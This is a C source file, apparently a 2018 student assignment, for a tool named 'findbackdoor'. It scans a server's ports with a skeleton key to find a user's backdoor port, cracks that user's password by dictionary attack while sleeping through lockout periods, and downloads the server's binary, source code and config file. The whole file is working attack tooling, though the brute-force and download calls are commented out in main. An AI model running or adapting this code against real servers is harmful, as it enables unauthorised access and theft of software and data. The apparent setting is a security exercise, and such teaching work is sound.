/*
 * This program accepts four arguments: ip address, skeleton key, username, and dictionary. 
 * The program first finds all the open ports on the server and access its backdoor using the 
 * skeleton key, then discovers the one that belongs to the specified username. The dictionary 
 * attack is then performed to crack the password. The binary and the source code are finally 
 * downloaded. 
 * 
 * Name: Tien Thuy Ho
 * Last edited: February 16, 2018
 */
#include "utils.h"

#define BINARY      "binary"
#define SOURCE      "source.c"
#define CONFIG      "student.dat"
#define SERVERINFO  "serverinfo.txt"

char                *ipaddress, *skeletonkey, *username, *dictionary, *password;
int	                sockfd;
struct sockaddr_in  servaddr;
char                buff[MAXLINE], response[MAXLINE];
FILE                *binaryfile, *sourcefile, *configfile, *serverfile;

/* 
 * Parse the server's locked out message to discover the timeout period. 
 */
static int gettimeout(char *message) {
    int timeout;
    char *token = strtok(message, " ");
    while (token != NULL) {
        if (sscanf(token, "%d", &timeout) == 1) {
            return timeout;
        }
        token = strtok(NULL, " ");
    }

    return 0;
}

/* 
 * Scan a port and see if it allows access to the server's backdoor using the 
 * skeleton key.
 */
static int scanport(int port) {
    int found = FALSE;
    int waittime = 1;
    int recv;

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("socket error");
        exit(1);
    }

    // set a timeout on read operation because some servers don't respond immediately
    // https://stackoverflow.com/a/2939145/7542147
    struct timeval tv;
    tv.tv_sec = waittime;
    tv.tv_usec = 0;
    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);

    // set the server's port
    servaddr.sin_port = htons(port);
    if (connect(sockfd, (struct sockaddr *) &servaddr, sizeof(servaddr)) == 0) {
        printf("Port %d is open.\n", port);
        fflush(stdout);

        // enter the skeleton key
        strcpy(buff, skeletonkey);
        if (write(sockfd, buff, strlen(buff)) < 0) {
            perror("write error");
            exit(0);
        }

        bzero(response, sizeof(response));
        if ((recv = read(sockfd, response, MAXLINE)) < 0) {
            // the server is unresponsive
            if (errno == EAGAIN || errno == EWOULDBLOCK) { 
                perror("Timeout");
            }   
        } else if (recv > 0 && strstr(response, "Username") != NULL) {
            // enter the username
            strcpy(buff, username);
            if (write(sockfd, buff, strlen(buff)) < 0) {
                perror("write error");
                exit(0);
            }

            bzero(response, sizeof(response));
            if (read(sockfd, response, MAXLINE) < 0) {
                perror("read error");
                exit(0);
            }

            if (strstr(response, "Password") != NULL) {
                printf("Port %d belongs to the user \"%s\".\n", port, username);
                printf("%s\n", DIVIDER);
                fflush(stdout);
                found = TRUE;
            }
        }
    }

    close(sockfd);
    return found;
}

/* 
 * Scan all the ports that are outside the IPv4 reserved range.
 */
static int findport() {
    for (int i = 1024; i < 65536; i++) {
        if (scanport(i)) {
            return i;
        }
    }

    return -1;
}

/* 
 * Connect to the server to enter a password. If the server is timed out, sleep 
 * for a period and retry.
 */
void reconnect() {
    int timeout = TRUE;
    int firsttime = TRUE;
    int naptime = 1;
    int sleeptime;

    do {
        close(sockfd);
        if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
            perror("socket error");
            exit(1);
        }

        if (connect(sockfd, (struct sockaddr *) &servaddr, sizeof(servaddr)) == 0) {
            // enter the skeleton key
            strcpy(buff, skeletonkey);
            if (write(sockfd, buff, strlen(buff)) < 0) {
                perror("write error");
                exit(0);
            }

            bzero(response, sizeof(response));
            if (read(sockfd, response, MAXLINE) < 0) {
                perror("read error");
                exit(0);
            }

            // enter the username
            strcpy(buff, username);
            if (write(sockfd, buff, strlen(buff)) < 0) {
                perror("write error");
                exit(0);
            }

            bzero(response, sizeof(response));
            if (read(sockfd, response, MAXLINE) < 0) {
                perror("read error");
                exit(0);
            }

            if (strstr(response, "Password") != NULL) { // the server asks for password
                timeout = FALSE;
                printf("Connected\n");
                fflush(stdout);
            } else if (strstr(response, "locked") != NULL) { // the server is timed out
                if (firsttime) { 
                    firsttime = FALSE;
                    sleeptime = gettimeout(response) + 1;
                    printf("Sleeping for %d seconds.\n", sleeptime);
                    fflush(stdout);
                    sleep(sleeptime);
                } else {
                    printf("Napping for %d seconds.\n", naptime);
                    fflush(stdout);
                    sleep(naptime); 
                } 
            }
        }
    } while (timeout);
}

/* 
 * Log into the server's backdoor with the skeleton key, username, and password.
 */
void login() {
    reconnect();

    // enter password
    strcpy(buff, password);
    if (write(sockfd, buff, strlen(buff)) < 0) {
        perror("write error");
        exit(0);
    }

    bzero(response, sizeof(response));
    if (read(sockfd, response, MAXLINE) < 0) {
        perror("read error");
        exit(0);
    }
}

/* 
 * Perform a dictionary attack to find a password. 
 */
void findpassword() {
    FILE *dictionaryfile = fopen(dictionary, "r");
    if (dictionaryfile) {
        char line[MAXLINE];
        while (fgets(line, MAXLINE, dictionaryfile) != NULL) {
            reconnect();
            strcpy(buff, line);
            if (write(sockfd, buff, strlen(buff)) < 0) {
                perror("write error");
                exit(0);
            }

            bzero(response, sizeof(response));
            if (read(sockfd, response, MAXLINE) < 0) {
                perror("read error");
                exit(0);
            }

            if (strstr(response, "goodbye") == NULL) {
                password = line;
                printf("Login success with password %s", password);
                printf("%s\n", DIVIDER);
                fflush(stdout);
                return;
            } else {
                printf("Failed password: %s\n", line);
                fflush(stdout);
            }
        }

        fclose(dictionaryfile);
    }

    printf("No password found.\n");
    fflush(stdout);
}

/* 
 * Download the config file
 */
void downloadconfig() {
    login();

    // enter the command to download the binary
    strcpy(buff, "config");
    if (write(sockfd, buff, strlen(buff)) < 0) {
        perror("write error");
        exit(0);
    }

    configfile = fopen(CONFIG, "w"); 
    if (configfile) {
        int finished = FALSE;
        while (!finished) {
            bzero(response, sizeof(response));
            int recvbytes = read(sockfd, response, MAXLINE);
            if (recvbytes < 0) {
                perror("read error");
                exit(0);
            } else if (recvbytes == 0) { // end of file
                finished = TRUE;
            } else {
                fputs(response, configfile);
            }
        }

        fclose(configfile);
    }    
}

/* 
 * Download the source code.
 */
void downloadsource() {
    login();

    printf("Downloading the source code ... ");
    fflush(stdout);

    // enter the command to download the binary
    strcpy(buff, "source");
    if (write(sockfd, buff, strlen(buff)) < 0) {
        perror("write error");
        exit(0);
    }

    sourcefile = fopen(SOURCE, "w"); 
    if (sourcefile) {
        int finished = FALSE;
        while (!finished) {
            bzero(response, sizeof(response));
            int recvbytes = read(sockfd, response, MAXLINE);
            if (recvbytes < 0) {
                perror("read error");
                exit(0);
            } else if (recvbytes == 0) { // end of file
                finished = TRUE;
            } else {
                fputs(response, sourcefile);
            }
        }

        fclose(sourcefile);
        printf("Done\n");
        printf("%s\n", DIVIDER);
        fflush(stdout);
    }    
}

/* 
 * Download the binary image of the server. 
 */
void downloadbinary() {
    login();

    printf("Downloading the binary ... ");
    fflush(stdout);

    // enter the command to download the binary
    strcpy(buff, "binary");
    if (write(sockfd, buff, strlen(buff)) < 0) {
        perror("write error");
        exit(0);
    }

    binaryfile = fopen(BINARY, "wb"); // write to a file in binary form
    if (binaryfile) {
        int finished = FALSE;
        while (!finished) {
            bzero(response, sizeof(response));
            int recvbytes = read(sockfd, response, MAXLINE);
            if (recvbytes < 0) {
                perror("read error");
                exit(0);
            } else if (recvbytes == 0) { // end of file
                finished = TRUE;
            } else {
                fwrite(response, 1, recvbytes, binaryfile); 
            }
        }

        fclose(binaryfile);
        printf("Done\n");
        printf("%s\n", DIVIDER);
        fflush(stdout);
    }
}

int main(int argc, char **argv) {
    char *usage = "Usage: findbackdoor <ipaddress> <skeleton key> <username> <dictionary>";

    if (argc != 5) {
        printf("%s\n", usage);
        exit(-1);
    }

    ipaddress = argv[1];
    skeletonkey = argv[2];
    username = argv[3];
    dictionary = argv[4];

    // initialize the server info
    bzero(&servaddr, sizeof(servaddr));
    servaddr.sin_family = AF_INET;

    // intialize the server's ip address
    if (inet_pton(AF_INET, ipaddress, &servaddr.sin_addr) <= 0) {
        printf("inet_pton error for %s", argv[1]);
        exit(0);
    }

    // find the port that accepts the specified username
    int port;
    if ((port = findport()) != -1) {
        servaddr.sin_port = htons(port);
    } else {
        printf("Cannot find port.\n");
        exit(0);
    }

    // write the ipaddress and port number to a file for future reference
    serverfile = fopen(SERVERINFO, "w");
    if (serverfile) {
        fprintf(serverfile, "%s\n", ipaddress);
        fprintf(serverfile, "%d", port);
        fclose(serverfile);
    }
   
    // findpassword();
    // downloadbinary();
    // downloadsource();
    // downloadconfig();
    
    return 0;
}
